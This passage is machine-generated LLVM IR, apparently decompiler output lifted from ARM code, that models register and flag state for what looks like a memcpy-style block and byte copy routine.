  store i1 %v7_16ba4, i1* %cpsr_z.global-to-local, align 1
  %v2_16ba8 = xor i1 %v6_16ba4, %v5_16ba4
  br i1 %v2_16ba8, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_16ba4
  %v3_16ba8 = load i32, i32* @r1, align 4
  %v4_16ba8 = inttoptr i32 %v3_16ba8 to i32*
  %v5_16ba8 = load i32, i32* %v4_16ba8, align 4
  store i32 %v5_16ba8, i32* @r3, align 4
  %v6_16ba8 = add i32 %v3_16ba8, 4
  %v7_16ba8 = inttoptr i32 %v6_16ba8 to i32*
  %v8_16ba8 = load i32, i32* %v7_16ba8, align 4
  store i32 %v8_16ba8, i32* %r4.global-to-local, align 4
  %v9_16ba8 = add i32 %v3_16ba8, 8
  %v10_16ba8 = inttoptr i32 %v9_16ba8 to i32*
  %v11_16ba8 = load i32, i32* %v10_16ba8, align 4
  store i32 %v11_16ba8, i32* @ip, align 4
  %v12_16ba8 = add i32 %v3_16ba8, 12
  %v13_16ba8 = inttoptr i32 %v12_16ba8 to i32*
  %v14_16ba8 = load i32, i32* %v13_16ba8, align 4
  store i32 %v14_16ba8, i32* %lr.global-to-local, align 4
  %v15_16ba8 = add i32 %v3_16ba8, 16
  store i32 %v15_16ba8, i32* @r1, align 4
  %v4_16bac = inttoptr i32 %v12_16b98 to i32*
  store i32 %v5_16ba8, i32* %v4_16bac, align 4
  %v6_16bac = add i32 %v0_16b90, 36
  %v7_16bac = inttoptr i32 %v6_16bac to i32*
  %v8_16bac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_16bac, i32* %v7_16bac, align 4
  %v9_16bac = add i32 %v0_16b90, 40
  %v10_16bac = inttoptr i32 %v9_16bac to i32*
  %v11_16bac = load i32, i32* @ip, align 4
  store i32 %v11_16bac, i32* %v10_16bac, align 4
  %v12_16bac = add i32 %v0_16b90, 44
  %v13_16bac = inttoptr i32 %v12_16bac to i32*
  %v14_16bac = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_16bac, i32* %v13_16bac, align 4
  %v15_16bac = add i32 %v0_16b90, 48
  store i32 %v15_16bac, i32* @r0, align 4
  %v3_16bb0 = load i32, i32* %r2.global-to-local, align 4
  %v4_16bb0 = add i32 %v3_16bb0, -16
  store i32 %v4_16bb0, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_16ba4, %bb136
  %v3_16bc0102111 = phi i32 [ %v15_16bac, %bb136 ], [ %v12_16b98, %dec_label_pc_16ba4 ]
  %v0_16bb8.pre = phi i32 [ %v4_16bb0, %bb136 ], [ %v1_16b9c, %dec_label_pc_16ba4 ]
  %v2_16bb4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16bb4, i32* @r4, align 4
  br label %dec_label_pc_16bb8

dec_label_pc_16bb8:                               ; preds = %dec_label_pc_16b80, %bb137
  %v3_16bc0101 = phi i32 [ %v0_16b9094, %dec_label_pc_16b80 ], [ %v3_16bc0102111, %bb137 ]
  %v0_16bb8 = phi i32 [ %v1_16b80, %dec_label_pc_16b80 ], [ %v0_16bb8.pre, %bb137 ]
  %v1_16bb8 = add i32 %v0_16bb8, 20
  store i32 %v1_16bb8, i32* %r2.global-to-local, align 4
  %v3_16bb8 = sub i32 0, %v0_16bb8
  %v4_16bb8 = and i32 %v1_16bb8, %v3_16bb8
  %v5_16bb8 = icmp slt i32 %v4_16bb8, 0
  store i1 %v5_16bb8, i1* %cpsr_v.global-to-local, align 1
  %v6_16bb8 = icmp slt i32 %v1_16bb8, 0
  store i1 %v6_16bb8, i1* %cpsr_n.global-to-local, align 1
  %v7_16bb8 = icmp eq i32 %v1_16bb8, 0
  store i1 %v7_16bb8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16bbc

dec_label_pc_16bbc:                               ; preds = %.thread115, %dec_label_pc_16bb8
  %v0_16bcc.pre157 = phi i32 [ %v0_16bcc.pre, %.thread115 ], [ %v1_16bb8, %dec_label_pc_16bb8 ]
  %v3_16bc0 = phi i32 [ %v3_16bc099116, %.thread115 ], [ %v3_16bc0101, %dec_label_pc_16bb8 ]
  %v1_16bc4 = phi i1 [ %v1_16bc8, %.thread115 ], [ %v5_16bb8, %dec_label_pc_16bb8 ]
  %v0_16bc4 = phi i1 [ %v0_16bc8, %.thread115 ], [ %v6_16bb8, %dec_label_pc_16bb8 ]
  %v2_16bbc = xor i1 %v1_16bc4, %v0_16bc4
  br i1 %v2_16bbc, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_16bbc
  %v3_16bbc = load i32, i32* @r1, align 4
  %v4_16bbc = inttoptr i32 %v3_16bbc to i32*
  %v5_16bbc = load i32, i32* %v4_16bbc, align 4
  store i32 %v5_16bbc, i32* @r3, align 4
  %v6_16bbc = add i32 %v3_16bbc, 4
  %v7_16bbc = inttoptr i32 %v6_16bbc to i32*
  %v8_16bbc = load i32, i32* %v7_16bbc, align 4
  store i32 %v8_16bbc, i32* @ip, align 4
  %v9_16bbc = add i32 %v3_16bbc, 8
  %v10_16bbc = inttoptr i32 %v9_16bbc to i32*
  %v11_16bbc = load i32, i32* %v10_16bbc, align 4
  store i32 %v11_16bbc, i32* %lr.global-to-local, align 4
  %v12_16bbc = add i32 %v3_16bbc, 12
  store i32 %v12_16bbc, i32* @r1, align 4
  %v4_16bc0 = inttoptr i32 %v3_16bc0 to i32*
  store i32 %v5_16bbc, i32* %v4_16bc0, align 4
  %v6_16bc0 = add i32 %v3_16bc0, 4
  %v7_16bc0 = inttoptr i32 %v6_16bc0 to i32*
  %v8_16bc0 = load i32, i32* @ip, align 4
  store i32 %v8_16bc0, i32* %v7_16bc0, align 4
  %v9_16bc0 = add i32 %v3_16bc0, 8
  %v10_16bc0 = inttoptr i32 %v9_16bc0 to i32*
  %v11_16bc0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16bc0, i32* %v10_16bc0, align 4
  %v12_16bc0 = add i32 %v3_16bc0, 12
  store i32 %v12_16bc0, i32* @r0, align 4
  %v3_16bc4 = load i32, i32* %r2.global-to-local, align 4
  %v4_16bc4 = add i32 %v3_16bc4, -12
  store i32 %v4_16bc4, i32* %r2.global-to-local, align 4
  %v6_16bc4 = sub i32 11, %v3_16bc4
  %v7_16bc4 = and i32 %v6_16bc4, %v3_16bc4
  %v8_16bc4 = icmp slt i32 %v7_16bc4, 0
  store i1 %v8_16bc4, i1* %cpsr_v.global-to-local, align 1
  %v9_16bc4 = icmp slt i32 %v4_16bc4, 0
  store i1 %v9_16bc4, i1* %cpsr_n.global-to-local, align 1
  %v10_16bc4 = icmp eq i32 %v3_16bc4, 12
  store i1 %v10_16bc4, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_16bbc, %bb138
  %v0_16bcc.pre = phi i32 [ %v4_16bc4, %bb138 ], [ %v0_16bcc.pre157, %dec_label_pc_16bbc ]
  %v3_16bc099116 = phi i32 [ %v12_16bc0, %bb138 ], [ %v3_16bc0, %dec_label_pc_16bbc ]
  %v1_16bc8 = phi i1 [ %v8_16bc4, %bb138 ], [ %v1_16bc4, %dec_label_pc_16bbc ]
  %v0_16bc8 = phi i1 [ %v9_16bc4, %bb138 ], [ %v0_16bc4, %dec_label_pc_16bbc ]
  %v2_16bc8 = xor i1 %v1_16bc8, %v0_16bc8
  br i1 %v2_16bc8, label %dec_label_pc_16bcc, label %dec_label_pc_16bbc

dec_label_pc_16bcc:                               ; preds = %.thread115, %dec_label_pc_16b78
  %v4_16bdc = phi i32 [ %v0_16b9094, %dec_label_pc_16b78 ], [ %v3_16bc099116, %.thread115 ]
  %v0_16bcc = phi i32 [ %v1_16b78, %dec_label_pc_16b78 ], [ %v0_16bcc.pre, %.thread115 ]
  %v1_16bcc = add i32 %v0_16bcc, 8
  store i32 %v1_16bcc, i32* %r2.global-to-local, align 4
  %v3_16bcc = sub i32 0, %v0_16bcc
  %v4_16bcc = and i32 %v1_16bcc, %v3_16bcc
  %v5_16bcc = icmp slt i32 %v4_16bcc, 0
  store i1 %v5_16bcc, i1* %cpsr_v.global-to-local, align 1
  %v6_16bcc = icmp slt i32 %v1_16bcc, 0
  store i1 %v6_16bcc, i1* %cpsr_n.global-to-local, align 1
  %v7_16bcc = icmp eq i32 %v1_16bcc, 0
  store i1 %v7_16bcc, i1* %cpsr_z.global-to-local, align 1
  %v2_16bd0 = xor i1 %v6_16bcc, %v5_16bcc
  br i1 %v2_16bd0, label %bb140, label %dec_label_pc_16bd4

dec_label_pc_16bd4:                               ; preds = %dec_label_pc_16bcc
  %v1_16bd4 = add i32 %v0_16bcc, 4
  store i32 %v1_16bd4, i32* %r2.global-to-local, align 4
  %v3_16bd4 = sub i32 -5, %v0_16bcc
  %v4_16bd4 = and i32 %v3_16bd4, %v1_16bcc
  %v5_16bd4 = icmp slt i32 %v4_16bd4, 0
  store i1 %v5_16bd4, i1* %cpsr_v.global-to-local, align 1
  %v6_16bd4 = icmp slt i32 %v1_16bd4, 0
  store i1 %v6_16bd4, i1* %cpsr_n.global-to-local, align 1
  %v7_16bd4 = icmp eq i32 %v1_16bcc, 4
  store i1 %v7_16bd4, i1* %cpsr_z.global-to-local, align 1
  %v2_16bd8 = xor i1 %v6_16bd4, %v5_16bd4
  %v3_16bd8 = load i32, i32* @r1, align 4
  %v4_16bd8 = inttoptr i32 %v3_16bd8 to i32*
  %v5_16bd8 = load i32, i32* %v4_16bd8, align 4
  store i32 %v5_16bd8, i32* @r3, align 4
  %v7_16bd8 = add i32 %v3_16bd8, 4
  br i1 %v2_16bd8, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_16bd4
  store i32 %v7_16bd8, i32* @r1, align 4
  %v5_16bdc = inttoptr i32 %v4_16bdc to i32*
  store i32 %v5_16bd8, i32* %v5_16bdc, align 4
  %v6_16bdc = load i32, i32* @r0, align 4
  %v7_16bdc = add i32 %v6_16bdc, 4
  store i32 %v7_16bdc, i32* @r0, align 4
  %v0_16bec.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_16bd4
  %v7_16be0 = inttoptr i32 %v7_16bd8 to i32*
  %v8_16be0 = load i32, i32* %v7_16be0, align 4
  store i32 %v8_16be0, i32* @ip, align 4
  %v9_16be0 = add i32 %v3_16bd8, 8
  store i32 %v9_16be0, i32* @r1, align 4
  %v4_16be4 = inttoptr i32 %v4_16bdc to i32*
  store i32 %v5_16bd8, i32* %v4_16be4, align 4
  %v6_16be4 = add i32 %v4_16bdc, 4
  %v7_16be4 = inttoptr i32 %v6_16be4 to i32*
  %v8_16be4 = load i32, i32* @ip, align 4
  store i32 %v8_16be4, i32* %v7_16be4, align 4
  %v9_16be4 = add i32 %v4_16bdc, 8
  store i32 %v9_16be4, i32* @r0, align 4
  %v3_16be8 = load i32, i32* %r2.global-to-local, align 4
  %v4_16be8 = add i32 %v3_16be8, -4
  store i32 %v4_16be8, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_16bcc, %bb, %dec_label_pc_16d9c, %dec_label_pc_16d30, %dec_label_pc_16cc4, %bb139
  %v0_16bec = phi i32 [ %v0_16bec.pre, %.thread122 ], [ %v2_16c3c, %.thread128 ], [ %v1_16bcc, %dec_label_pc_16bcc ], [ %v2_16b60, %bb ], [ %v0_16bec61, %dec_label_pc_16d9c ], [ %v0_16bec60, %dec_label_pc_16d30 ], [ %v0_16bec59, %dec_label_pc_16cc4 ], [ %v4_16be8, %bb139 ]
  %v1_16bec = add i32 %v0_16bec, 4
  store i32 %v1_16bec, i32* %r2.global-to-local, align 4
  %v3_16bec = sub i32 0, %v0_16bec
  %v4_16bec = and i32 %v1_16bec, %v3_16bec
  %v5_16bec = icmp slt i32 %v4_16bec, 0
  store i1 %v5_16bec, i1* %cpsr_v.global-to-local, align 1
  %v6_16bec = icmp slt i32 %v1_16bec, 0
  store i1 %v6_16bec, i1* %cpsr_n.global-to-local, align 1
  %v7_16bec = icmp eq i32 %v1_16bec, 0
  store i1 %v7_16bec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16bec, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_16bf4.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_16bf0 = load i8*, i8** %stack_var_-8, align 4
  %v4_16bf0 = ptrtoint i8* %v3_16bf0 to i32
  store i32 %v4_16bf0, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_16bf4 = phi i32 [ %v0_16bf4.pre, %bb140.bb142_crit_edge ], [ %v8_16b5c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_16bec, i32 %v0_16bf4)
  %v0_16bf8 = load i32, i32* %r2.global-to-local, align 4
  %v1_16bf8 = add i32 %v0_16bf8, -2
  %v3_16bf8 = sub i32 1, %v0_16bf8
  %v4_16bf8 = and i32 %v3_16bf8, %v0_16bf8
  %v5_16bf8 = icmp slt i32 %v4_16bf8, 0
  store i1 %v5_16bf8, i1* %cpsr_v.global-to-local, align 1
  %v6_16bf8 = icmp slt i32 %v1_16bf8, 0
  store i1 %v6_16bf8, i1* %cpsr_n.global-to-local, align 1
  %v7_16bf8 = icmp eq i32 %v0_16bf8, 2
  store i1 %v7_16bf8, i1* %cpsr_z.global-to-local, align 1
  %v0_16bfc = load i32, i32* @r1, align 4
  %v1_16bfc = inttoptr i32 %v0_16bfc to i8*
  %v2_16bfc = load i8, i8* %v1_16bfc, align 1
  %v5_16bfc = add i32 %v0_16bfc, 1
  store i32 %v5_16bfc, i32* %r1.global-to-local, align 4
  %v2_16c00 = load i32, i32* @r0, align 4
  %v3_16c00 = inttoptr i32 %v2_16c00 to i8*
  store i8 %v2_16bfc, i8* %v3_16c00, align 1
  %v4_16c00 = load i32, i32* @r0, align 4
  %v5_16c00 = add i32 %v4_16c00, 1
  store i32 %v5_16c00, i32* %r0.global-to-local, align 4
  %v0_16c04 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16c04 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16c04 = xor i1 %v0_16c04, %v1_16c04
  br i1 %v2_16c04, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_16c04 = load i32, i32* %r1.global-to-local, align 4
  %v4_16c04 = inttoptr i32 %v3_16c04 to i8*
  %v5_16c04 = load i8, i8* %v4_16c04, align 1
  %v8_16c04 = add i32 %v3_16c04, 1
  store i32 %v8_16c04, i32* %r1.global-to-local, align 4
  %v6_16c08 = inttoptr i32 %v5_16c00 to i8*
  store i8 %v5_16c04, i8* %v6_16c08, align 1
  %v7_16c08 = load i32, i32* %r0.global-to-local, align 4
  %v8_16c08 = add i32 %v7_16c08, 1
  store i32 %v8_16c08, i32* %r0.global-to-local, align 4
  %v1_16c0c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16c0c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_16c10 = phi i32 [ %v8_16c08, %bb143 ], [ %v5_16c00, %bb142 ]
  %v2_16c10 = phi i1 [ %v2_16c0c.pre, %bb143 ], [ %v1_16c04, %bb142 ]
  %v1_16c10 = phi i1 [ %v1_16c0c.pre, %bb143 ], [ %v0_16c04, %bb142 ]
  %v0_16c0c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16c0c = xor i1 %v2_16c10, %v1_16c10
  %v4_16c0c = or i1 %v0_16c0c, %v3_16c0c
  br i1 %v4_16c0c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_16c0c = load i32, i32* %r1.global-to-local, align 4
  %v6_16c0c = inttoptr i32 %v5_16c0c to i8*
  %v7_16c0c = load i8, i8* %v6_16c0c, align 1
  %v10_16c0c = add i32 %v5_16c0c, 1
  store i32 %v10_16c0c, i32* %r1.global-to-local, align 4
  %v8_16c10 = inttoptr i32 %v7_16c10 to i8*
  store i8 %v7_16c0c, i8* %v8_16c10, align 1
  %v9_16c10 = load i32, i32* %r0.global-to-local, align 4
  %v10_16c10 = add i32 %v9_16c10, 1
  store i32 %v10_16c10, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_16c14 = load i8*, i8** %stack_var_-8, align 4
  %v3_16c14 = ptrtoint i8* %v2_16c14 to i32
  store i32 %v3_16c14, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_16b5c)
  %v0_16c1c.pre = load i32, i32* @ip, align 4
  %v0_16c24.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_16c28.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_16c1c

dec_label_pc_16c1c:                               ; preds = %dec_label_pc_16b68, %.thread126
  %v2_16c28 = phi i32 [ %v1_16b50, %dec_label_pc_16b68 ], [ %v2_16c28.pre, %.thread126 ]
  %v0_16c24 = phi i32 [ %v0_16b50, %dec_label_pc_16b68 ], [ %v0_16c24.pre, %.thread126 ]
  %v0_16c1c = phi i32 [ %v1_16b68, %dec_label_pc_16b68 ], [ %v0_16c1c.pre, %.thread126 ]
  %v1_16c1c = sub i32 4, %v0_16c1c
  store i32 %v1_16c1c, i32* @ip, align 4
  %v1_16c20 = add i32 %v1_16c1c, -2
  %v3_16c20 = sub i32 1, %v1_16c1c
  %v4_16c20 = and i32 %v3_16c20, %v1_16c1c
  %v5_16c20 = icmp slt i32 %v4_16c20, 0
  store i1 %v5_16c20, i1* %cpsr_v.global-to-local, align 1
  %v6_16c20 = icmp slt i32 %v1_16c20, 0
  store i1 %v6_16c20, i1* %cpsr_n.global-to-local, align 1
  %v7_16c20 = icmp eq i32 %v1_16c1c, 2
  store i1 %v7_16c20, i1* %cpsr_z.global-to-local, align 1
  %v1_16c24 = inttoptr i32 %v0_16c24 to i8*
  %v2_16c24 = load i8, i8* %v1_16c24, align 1
  %v3_16c24 = zext i8 %v2_16c24 to i32
  store i32 %v3_16c24, i32* @r3, align 4
  %v5_16c24 = add i32 %v0_16c24, 1
  store i32 %v5_16c24, i32* @r1, align 4
  %v3_16c28 = inttoptr i32 %v2_16c28 to i8*
  store i8 %v2_16c24, i8* %v3_16c28, align 1
  %v4_16c28 = load i32, i32* @r0, align 4
  %v5_16c28 = add i32 %v4_16c28, 1
  store i32 %v5_16c28, i32* @r0, align 4
  %v0_16c2c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16c2c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16c2c = xor i1 %v0_16c2c, %v1_16c2c
  br i1 %v2_16c2c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_16c1c
  %v3_16c2c = load i32, i32* @r1, align 4
  %v4_16c2c = inttoptr i32 %v3_16c2c to i8*
  %v5_16c2c = load i8, i8* %v4_16c2c, align 1
  %v6_16c2c = zext i8 %v5_16c2c to i32
  store i32 %v6_16c2c, i32* @r3, align 4
  %v8_16c2c = add i32 %v3_16c2c, 1
  store i32 %v8_16c2c, i32* @r1, align 4
  %v6_16c30 = inttoptr i32 %v5_16c28 to i8*
  store i8 %v5_16c2c, i8* %v6_16c30, align 1
  %v7_16c30 = load i32, i32* @r0, align 4
  %v8_16c30 = add i32 %v7_16c30, 1
  store i32 %v8_16c30, i32* @r0, align 4
  %v1_16c34.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16c34.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_16c1c, %bb145
  %v7_16c38 = phi i32 [ %v8_16c30, %bb145 ], [ %v5_16c28, %dec_label_pc_16c1c ]
  %v2_16c38 = phi i1 [ %v2_16c34.pre, %bb145 ], [ %v1_16c2c, %dec_label_pc_16c1c ]
  %v1_16c38 = phi i1 [ %v1_16c34.pre, %bb145 ], [ %v0_16c2c, %dec_label_pc_16c1c ]
  %v0_16c34 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16c34 = xor i1 %v2_16c38, %v1_16c38
  %v4_16c34 = or i1 %v0_16c34, %v3_16c34
  br i1 %v4_16c34, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_16c34 = load i32, i32* @r1, align 4
  %v6_16c34 = inttoptr i32 %v5_16c34 to i8*
  %v7_16c34 = load i8, i8* %v6_16c34, align 1
  %v8_16c34 = zext i8 %v7_16c34 to i32
  store i32 %v8_16c34, i32* @r3, align 4
  %v10_16c34 = add i32 %v5_16c34, 1
  store i32 %v10_16c34, i32* @r1, align 4
  %v8_16c38 = inttoptr i32 %v7_16c38 to i8*
  store i8 %v7_16c34, i8* %v8_16c38, align 1
  %v9_16c38 = load i32, i32* @r0, align 4
  %v10_16c38 = add i32 %v9_16c38, 1
  store i32 %v10_16c38, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_16d6c77 = phi i32 [ %v10_16c38, %bb146 ], [ %v7_16c38, %.thread127 ]
  %v0_16c3c = load i32, i32* %r2.global-to-local, align 4
  %v1_16c3c = load i32, i32* @ip, align 4
  %v2_16c3c = sub i32 %v0_16c3c, %v1_16c3c
  store i32 %v2_16c3c, i32* %r2.global-to-local, align 4
  %v4_16c3c = xor i32 %v1_16c3c, %v0_16c3c
  %v5_16c3c = xor i32 %v2_16c3c, %v0_16c3c
  %v6_16c3c = and i32 %v5_16c3c, %v4_16c3c
  %v7_16c3c = icmp slt i32 %v6_16c3c, 0
  store i1 %v7_16c3c, i1* %cpsr_v.global-to-local, align 1
  %v8_16c3c = icmp slt i32 %v2_16c3c, 0
  store i1 %v8_16c3c, i1* %cpsr_n.global-to-local, align 1
  %v9_16c3c = icmp eq i32 %v0_16c3c, %v1_16c3c
  store i1 %v9_16c3c, i1* %cpsr_z.global-to-local, align 1
  %v2_16c40 = xor i1 %v8_16c3c, %v7_16c3c
  br i1 %v2_16c40, label %bb140, label %dec_label_pc_16c44

dec_label_pc_16c44:                               ; preds = %.thread128
  %v0_16c44 = load i32, i32* @r1, align 4
  %v1_16c44 = urem i32 %v0_16c44, 4
  store i32 %v1_16c44, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16c44 = icmp eq i32 %v1_16c44, 0
  store i1 %v2_16c44, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_16c44 to i2
  br i1 %v2_16c44, label %dec_label_pc_16b78, label %dec_label_pc_16c4c

dec_label_pc_16c4c:                               ; preds = %dec_label_pc_16b70, %dec_label_pc_16c44
  %v0_16d6c76 = phi i32 [ %v1_16b50, %dec_label_pc_16b70 ], [ %v0_16d6c77, %dec_label_pc_16c44 ]
  %v0_16cd4 = phi i32 [ %v2_16b60, %dec_label_pc_16b70 ], [ %v2_16c3c, %dec_label_pc_16c44 ]
  %v0_16c54.off0 = phi i2 [ %extract.t, %dec_label_pc_16b70 ], [ %extract.t131, %dec_label_pc_16c44 ]
  %v0_16c4c = phi i32 [ %v0_16b50, %dec_label_pc_16b70 ], [ %v0_16c44, %dec_label_pc_16c44 ]
  %v1_16c4c = and i32 %v0_16c4c, -4
  store i32 %v1_16c4c, i32* %r1.global-to-local, align 4
  %v1_16c50 = inttoptr i32 %v1_16c4c to i32*
  %v2_16c50 = load i32, i32* %v1_16c50, align 4
  store i32 %v2_16c50, i32* %lr.global-to-local, align 4
  %v4_16c50 = add i32 %v1_16c4c, 4
  store i32 %v4_16c50, i32* %r1.global-to-local, align 4
  %v1_16ccc = add i32 %v0_16cd4, -12
  %v3_16ccc = sub i32 11, %v0_16cd4
  %v4_16ccc = and i32 %v3_16ccc, %v0_16cd4
  %v5_16ccc = icmp slt i32 %v4_16ccc, 0
  store i1 %v5_16ccc, i1* %cpsr_v.global-to-local, align 1
  %v6_16ccc = icmp slt i32 %v1_16ccc, 0
  store i1 %v6_16ccc, i1* %cpsr_n.global-to-local, align 1
  %v7_16ccc = icmp eq i32 %v0_16cd4, 12
  store i1 %v7_16ccc, i1* %cpsr_z.global-to-local, align 1
  %v2_16cd0 = xor i1 %v6_16ccc, %v5_16ccc
  switch i2 %v0_16c54.off0, label %dec_label_pc_16c60 [
    i2 -1, label %dec_label_pc_16d38
    i2 -2, label %dec_label_pc_16ccc
  ]

dec_label_pc_16c60:                               ; preds = %dec_label_pc_16c4c
  br i1 %v2_16cd0, label %dec_label_pc_16cac, label %dec_label_pc_16c68

dec_label_pc_16c68:                               ; preds = %dec_label_pc_16c60
  store i32 %v1_16ccc, i32* %r2.global-to-local, align 4
  %v3_16c6c = load i32, i32* @r4, align 4
  store i32 %v3_16c6c, i32* %stack_var_-16, align 4
  %v6_16c6c = load i32, i32* @r5, align 4
  store i32 %v6_16c6c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16c70

dec_label_pc_16c70:                               ; preds = %dec_label_pc_16c70.dec_label_pc_16c70_crit_edge, %dec_label_pc_16c68
  %v0_16c94 = phi i32 [ %v12_16c94, %dec_label_pc_16c70.dec_label_pc_16c70_crit_edge ], [ %v0_16d6c76, %dec_label_pc_16c68 ]
  %v0_16c74 = phi i32 [ %v0_16c74.pre, %dec_label_pc_16c70.dec_label_pc_16c70_crit_edge ], [ %v4_16c50, %dec_label_pc_16c68 ]
  %v0_16c70 = phi i32 [ %v0_16c70.pre, %dec_label_pc_16c70.dec_label_pc_16c70_crit_edge ], [ %v2_16c50, %dec_label_pc_16c68 ]
  %v3_16c70 = udiv i32 %v0_16c70, 256
  %v1_16c74 = inttoptr i32 %v0_16c74 to i32*
  %v2_16c74 = load i32, i32* %v1_16c74, align 4
  store i32 %v2_16c74, i32* %r4.global-to-local, align 4
  %v3_16c74 = add i32 %v0_16c74, 4
  %v4_16c74 = inttoptr i32 %v3_16c74 to i32*
  %v5_16c74 = load i32, i32* %v4_16c74, align 4
  store i32 %v5_16c74, i32* %r5.global-to-local, align 4
  %v6_16c74 = add i32 %v0_16c74, 8
  %v7_16c74 = inttoptr i32 %v6_16c74 to i32*
  %v8_16c74 = load i32, i32* %v7_16c74, align 4
  store i32 %v8_16c74, i32* %ip.global-to-local, align 4
  %v9_16c74 = add i32 %v0_16c74, 12
  %v10_16c74 = inttoptr i32 %v9_16c74 to i32*
  %v11_16c74 = load i32, i32* %v10_16c74, align 4
  store i32 %v11_16c74, i32* %lr.global-to-local, align 4
  %v12_16c74 = add i32 %v0_16c74, 16
  store i32 %v12_16c74, i32* %r1.global-to-local, align 4
  %v4_16c78 = mul i32 %v2_16c74, 16777216
  %v5_16c78 = or i32 %v4_16c78, %v3_16c70
  store i32 %v5_16c78, i32* @r3, align 4
  %v3_16c7c = udiv i32 %v2_16c74, 256
  %v4_16c80 = mul i32 %v5_16c74, 16777216
  %v5_16c80 = or i32 %v4_16c80, %v3_16c7c
  store i32 %v5_16c80, i32* %r4.global-to-local, align 4
  %v3_16c84 = udiv i32 %v5_16c74, 256
  %v4_16c88 = mul i32 %v8_16c74, 16777216
  %v5_16c88 = or i32 %v4_16c88, %v3_16c84
  store i32 %v5_16c88, i32* %r5.global-to-local, align 4
  %v3_16c8c = udiv i32 %v8_16c74, 256
  %v4_16c90 = mul i32 %v11_16c74, 16777216
  %v5_16c90 = or i32 %v4_16c90, %v3_16c8c
  store i32 %v5_16c90, i32* @ip, align 4
  %v1_16c94 = inttoptr i32 %v0_16c94 to i32*
  store i32 %v5_16c78, i32* %v1_16c94, align 4
  %v3_16c94 = add i32 %v0_16c94, 4
  %v4_16c94 = inttoptr i32 %v3_16c94 to i32*
  %v5_16c94 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16c94, i32* %v4_16c94, align 4
  %v6_16c94 = add i32 %v0_16c94, 8
  %v7_16c94 = inttoptr i32 %v6_16c94 to i32*
  %v8_16c94 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16c94, i32* %v7_16c94, align 4
  %v9_16c94 = add i32 %v0_16c94, 12
  %v10_16c94 = inttoptr i32 %v9_16c94 to i32*
  %v11_16c94 = load i32, i32* @ip, align 4
  store i32 %v11_16c94, i32* %v10_16c94, align 4
  %v12_16c94 = add i32 %v0_16c94, 16
  store i32 %v12_16c94, i32* @r0, align 4
  %v0_16c98 = load i32, i32* %r2.global-to-local, align 4
  %v1_16c98 = add i32 %v0_16c98, -16
  store i32 %v1_16c98, i32* %r2.global-to-local, align 4
  %v3_16c98 = sub i32 15, %v0_16c98
  %v4_16c98 = and i32 %v3_16c98, %v0_16c98
  %v5_16c98 = icmp slt i32 %v4_16c98, 0
  %v6_16c98 = icmp slt i32 %v1_16c98, 0
  %v2_16c9c = xor i1 %v6_16c98, %v5_16c98
  br i1 %v2_16c9c, label %dec_label_pc_16ca0, label %dec_label_pc_16c70.dec_label_pc_16c70_crit_edge

dec_label_pc_16c70.dec_label_pc_16c70_crit_edge:  ; preds = %dec_label_pc_16c70
  %v0_16c70.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_16c74.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16c70

dec_label_pc_16ca0:                               ; preds = %dec_label_pc_16c70
  %v2_16ca0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16ca0, i32* @r4, align 4
  %v5_16ca0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16ca0, i32* @r5, align 4
  %v1_16ca4 = add i32 %v0_16c98, -4
  store i32 %v1_16ca4, i32* %r2.global-to-local, align 4
  %v3_16ca4 = add i32 %v0_16c98, 2147483632
  %v4_16ca4 = and i32 %v1_16ca4, %v3_16ca4
